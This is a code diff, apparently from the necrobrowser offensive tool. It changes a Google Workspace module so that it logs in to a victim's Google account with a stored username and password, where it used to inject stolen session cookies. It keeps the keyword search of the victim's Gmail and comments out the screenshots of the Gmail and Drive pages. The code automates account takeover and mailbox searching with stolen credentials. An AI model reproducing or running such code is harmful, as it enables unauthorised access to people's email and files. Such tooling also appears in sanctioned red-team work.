@@ -6,8 +6,8 @@ import (
 	"github.com/evilsocket/islazy/tui"
 
 	"github.com/muraenateam/necrobrowser/action"
-	"github.com/muraenateam/necrobrowser/action/cookie"
-	"github.com/muraenateam/necrobrowser/action/screenshot"
+	"github.com/muraenateam/necrobrowser/action/login"
+	//"github.com/muraenateam/necrobrowser/action/screenshot"
 	"github.com/muraenateam/necrobrowser/log"
 	"github.com/muraenateam/necrobrowser/zombie"
 )
@@ -66,38 +66,38 @@ func (z *GSuite) Instrument() (interface{}, error) {
 	a := action.Action{Target: z.Target}
 	z.Info("Instrumenting Google accounts")
 
-	// Set session Cookies
-	c := &cookie.Cookie{Action: a}
-	if err = c.SetSessionCookies(); err != nil {
-		log.Error("Error setting session cookies: %v", err)
+	login := &login.Login{
+		Action:           a,
+		URL:              "https://accounts.google.com/signin/v2/identifier",
+		Username:         z.Target.Username,
+		UsernameSelector: `#identifierId`,
+		Password:         z.Target.Password,
+		PasswordSelector: `#password > div > div > div > input`,
+	}
+	if err = login.Do(); err != nil {
+		log.Error("Error performing login: %v", err)
 		return nil, err
 	}
 
-	z.Debug("Extracting personal information")
-
-	// Take Screenshot
-	s := &screenshot.Screenshot{
-		Action: a,
-		URL:    z.MyAccount,
-		// No selector, take full page
-	}
-	s.Target = z.Target
-	if err = s.Take(); err != nil {
-		log.Error("Error taking Screenshot: %s", err)
-	}
+	// Set session Cookies
+	//c := &cookie.Cookie{Action: a}
+	//if err = c.SetSessionCookies(); err != nil {
+	//	log.Error("Error setting session cookies: %v", err)
+	//	return nil, err
+	//}
 
 	z.Debug("Extracting gmail data information")
 
 	// Take Screenshot
-	s = &screenshot.Screenshot{
-		Action: a,
-		URL:    z.GMailUrl,
-		// No selector, take full page
-	}
-	s.Target = z.Target
-	if err = s.Take(); err != nil {
-		log.Error("Error taking Screenshot: %s", err)
-	}
+	//s := &screenshot.Screenshot{
+	//	Action: a,
+	//	URL:    z.GMailUrl,
+	//	// No selector, take full page
+	//}
+	//s.Target = z.Target
+	//if err = s.Take(); err != nil {
+	//	log.Error("Error taking Screenshot: %s", err)
+	//}
 
 	// search for defined keywords
 	for _, keyword := range z.SearchForKeywords {
@@ -108,16 +108,16 @@ func (z *GSuite) Instrument() (interface{}, error) {
 		}
 	}
 
-	z.Debug("Instrumenting GDrive")
-	s = &screenshot.Screenshot{
-		Action: a,
-		URL:    z.GDriveUrl,
-		// No selector, take full page
-	}
-	s.Target = z.Target
-	if err = s.Take(); err != nil {
-		log.Error("Error taking screenshot: %v", err)
-	}
+	//z.Debug("Instrumenting GDrive")
+	//s = &screenshot.Screenshot{
+	//	Action: a,
+	//	URL:    z.GDriveUrl,
+	//	// No selector, take full page
+	//}
+	//s.Target = z.Target
+	//if err = s.Take(); err != nil {
+	//	log.Error("Error taking screenshot: %v", err)
+	//}
 
 	return "", nil
 }
